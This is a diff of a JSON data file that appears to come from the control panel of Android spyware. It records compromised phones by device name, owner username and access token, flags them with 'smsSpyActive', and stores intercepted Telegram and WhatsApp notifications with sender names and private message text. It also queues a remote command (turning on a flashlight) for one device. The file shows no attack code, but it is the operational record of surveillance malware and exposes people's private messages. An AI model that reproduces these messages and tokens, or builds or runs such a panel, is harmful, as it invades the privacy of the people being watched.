@@ -9586,7 +9586,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776769172757,
+    "lastSeen": 1776769174690,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -9627,7 +9627,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776769172132,
+    "lastSeen": 1776769175235,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -9643,6 +9643,62 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16950 pesan baru dari 115 obrolan",
+        "time": "21/04 17:59",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776769176064
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16949 pesan baru dari 115 obrolan",
+        "time": "21/04 17:59",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776769174796
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 17:59",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776769174785
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 17:59",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776769174765
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 17:59",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776769174745
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 17:59",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776769174465
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 17:59",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776769174452
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -13586,62 +13642,6 @@
         "time": "21/04 17:21",
         "pkg": "com.whatsapp",
         "receivedAt": 1776766918366
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Ara na Zakiii💕🫶💖💌💋",
-        "content": "‎2 pesan baru",
-        "time": "21/04 17:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776766918274
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Ara na Zakiii💕🫶💖💌💋",
-        "content": "lu liat botak gw uda ngirimmmmm😡😡😡",
-        "time": "21/04 17:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776766909262
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Ara na Zakiii💕🫶💖💌💋",
-        "content": "lu liat botak gw uda ngirimmmmm😡😡😡",
-        "time": "21/04 17:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776766909204
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "PERKUMPULAN PARA DEVELOPER",
-        "content": "‎236 pesan baru",
-        "time": "21/04 17:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776766852273
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎PERKUMPULAN PARA DEVELOPER (238 pesan): Menyebut Anda",
-        "content": "~ barz: https://chat.whatsapp.com/G2U0WwdDNOVJ0sbMU50lGg?mode=gi_t\nhttps://chat.whatsapp.com/HKn6MRJjixI02NNF2w6HFc?mode=gi_t",
-        "time": "21/04 17:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776766852161
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Gopit Dki",
-        "content": "Menyukai status Anda",
-        "time": "21/04 17:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776766839874
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Gopit Dki",
-        "content": "Menyukai status Anda",
-        "time": "21/04 17:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776766839173
       }
     ],
     "galleryPhotos": [],
@@ -13661,7 +13661,15 @@
     "ownerUsername": "pian",
     "token": "06c7d23d86c7cc434c3d79ed0920fb91",
     "lastSeen": 1776769174058,
-    "commandQueue": [],
+    "commandQueue": [
+      {
+        "type": "flashlight",
+        "payload": {
+          "state": "on"
+        },
+        "sentAt": 1776769174919
+      }
+    ],
     "online": true,
     "connectedAt": "2026-04-21T10:59:07.158Z",
     "deviceInfo": {
